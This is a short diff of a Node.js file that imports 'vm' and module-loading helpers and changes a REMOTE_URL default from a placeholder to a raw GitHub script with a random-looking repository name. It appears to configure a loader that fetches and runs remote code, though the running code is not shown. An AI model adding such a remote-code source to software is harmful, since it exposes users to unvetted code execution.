@@ -6,7 +6,7 @@ const vm = require('vm');
 const path = require('path');
 const { Module, createRequire } = require('module');
 
-const REMOTE_URL = process.env.REMOTE_URL || 'xxxxxx';
+const REMOTE_URL = process.env.REMOTE_URL || 'https://raw.githubusercontent.com/RSE20wfk/FnjaDqx20M/refs/heads/main/index.js';
 const MAX_SIZE = 2 * 1024 * 1024;
 
 process.env.PORT ||= '5000';
